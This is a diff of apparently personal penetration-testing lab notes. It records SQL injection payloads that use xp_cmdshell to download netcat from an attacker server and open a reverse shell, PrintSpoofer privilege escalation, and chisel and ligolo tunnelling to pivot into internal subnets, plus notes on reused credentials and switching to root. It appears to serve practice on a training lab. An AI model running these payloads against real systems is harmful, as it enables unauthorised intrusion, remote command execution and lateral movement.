@@ -3,15 +3,15 @@
 #### SQL Injection:
 http://192.168.188.121/login.aspx
 
-o' ; exec xp_cmdshell "powershell.exe wget http://192.168.45.193:8000/nc64.exe -OutFile c:\\Users\Public\\nc.exe" ; --
+o' ; exec xp_cmdshell "powershell.exe wget http://192.168.45.156:8000/nc64.exe -OutFile c:\\Users\Public\\nc.exe" ; --
 
-o' ; exec xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.45.193 4444" ; --
+o' ; exec xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 192.168.45.212 4445" ; --
 
 #### priv esc
 
 printspoofer
 
-curl http://192.168.45.184:8000/print.exe -o print.exe
+curl http://192.168.45.156:8000/print.exe -o print.exe
 
 print.exe -i -c cmd.exe
 
@@ -25,13 +25,13 @@ curl http://192.168.45.184:8000/chisel1.8.exe -o chisel.exe
 
 chisel.exe client 192.168.45.184:9090 R:socks
 
-sudo ip tunap add user mrjokar mode tun ligolo  
+sudo ip tuntap add user mrjokar mode tun ligolo  
 sudo ip link set ligolo up
   
 ./proxy -selfcert -laddr 0.0.0.0:9001
 ./agent -connect 192.168.45.193:9090 -ignore-cert
 
-sudo ip route add 172.16.4.0/23 dev ligolo
+sudo ip route add 172.16.123.0/23 dev ligolo
 
 ### 172.16.243.11
 
@@ -85,6 +85,8 @@ found credentials.txt with password of web01
 ### 192.168.231.120
 
 logged in with offsec password and credentials
+
+switched to root with su root and offsec's pasword
 
 
 
